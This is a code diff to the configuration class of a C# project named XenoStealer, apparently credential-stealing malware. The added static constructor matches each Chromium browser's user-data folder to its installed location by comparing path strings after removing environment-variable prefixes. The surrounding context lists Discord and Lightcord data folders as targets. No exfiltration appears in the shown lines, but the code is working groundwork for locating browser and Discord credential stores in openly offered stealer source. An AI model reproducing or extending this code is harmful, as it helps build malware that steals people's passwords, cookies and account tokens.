@@ -1,5 +1,6 @@
 ﻿using System;
 using System.Collections.Generic;
+using System.IO;
 using System.Linq;
 using System.Text;
 using System.Threading.Tasks;
@@ -8,6 +9,66 @@ namespace XenoStealer
 {
     public static class Configuration
     {
+        static Configuration() 
+        {
+            string[] browsers = Utils.GetInstalledBrowsers();
+            foreach (string browser in ChromiumBrowsers.Keys) 
+            {
+                string dataPath = RemoveEnvVarFromPath(ChromiumBrowsers[browser]).ToLower();
+                string endName = new DirectoryInfo(dataPath).Name;
+                if (endName.Contains("user")) 
+                {
+                    dataPath = dataPath.Substring(0, dataPath.Length-endName.Length-1);//-1 for the backslash
+                }
+
+                string bestLibraryPath = null;
+                double maxResult = double.MinValue;
+
+                foreach (string LibraryPath in browsers)
+                {
+                    string filtered = RemoveEnvVarFromPath(Path.GetDirectoryName(LibraryPath)).ToLower();
+                    double result = Utils.CalculateStringSimilarity(filtered, dataPath);
+
+                    if (result > maxResult)
+                    {
+                        maxResult = result;
+                        bestLibraryPath = LibraryPath;
+                    }
+                }
+                ChromiumBrowsersLikelyLocations[browser]= bestLibraryPath;
+            }
+        }
+
+
+        static string RemoveEnvVarFromPath(string path)
+        {
+            string largestMatch = null;
+
+            // Iterate through all environment variables
+            foreach (var envVar in Environment.GetEnvironmentVariables().Keys)
+            {
+                string envValue = Environment.GetEnvironmentVariable(envVar.ToString());
+
+                if (!string.IsNullOrEmpty(envValue) && path.StartsWith(envValue, StringComparison.OrdinalIgnoreCase))
+                {
+                    // Check if the current environment variable value is larger than the previous match
+                    if (largestMatch == null || envValue.Length > largestMatch.Length)
+                    {
+                        largestMatch = envValue;
+                    }
+                }
+            }
+
+            // If we found a match, remove it and return the remaining part of the path
+            if (largestMatch != null)
+            {
+                return path.Replace(largestMatch, "").TrimStart(Path.DirectorySeparatorChar, Path.AltDirectorySeparatorChar);
+            }
+
+            // If no match found, return the path unchanged
+            return path;
+        }
+
         public static readonly string commonAppdata = Environment.GetFolderPath(Environment.SpecialFolder.CommonApplicationData);
         public static readonly string localAppData = Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData);
         public static readonly string roamingAppData = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData);
@@ -39,6 +100,11 @@ namespace XenoStealer
             $"{roamingAppData}\\DiscordPTB",
             $"{roamingAppData}\\DiscordDevelopment",
             $"{roamingAppData}\\Lightcord"
+        };
+
+        public static Dictionary<string, string> ChromiumBrowsersLikelyLocations = new Dictionary<string, string>
+        {
+
         };
 
         public static Dictionary<string, string> ChromiumBrowsers = new Dictionary<string, string>
